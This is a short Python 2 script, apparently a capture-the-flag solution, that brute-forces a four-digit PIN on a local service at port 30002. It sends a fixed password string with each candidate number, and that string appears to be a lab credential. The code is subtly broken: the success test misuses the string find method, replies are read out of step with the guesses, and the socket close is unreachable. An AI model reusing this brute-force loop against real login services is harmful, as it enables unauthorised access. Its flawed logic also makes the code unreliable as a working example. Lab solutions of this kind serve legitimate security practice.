#!/usr/bin/python

import socket
import sys
  
def main():
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect(('127.0.0.1',30002))
    for i in range(2419,9999):
        try:
            data = "UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ {}".format(i)
            r = s.recv(1024)
            if(r.find("Try")):
                print r+"{}".format(i)
            else:
                print r
                sys.exit()
            s.sendall(data+"\n")
        except:
            print "Error!!"
            sys.exit()
            s.close()
if __name__ == '__main__':
   main()
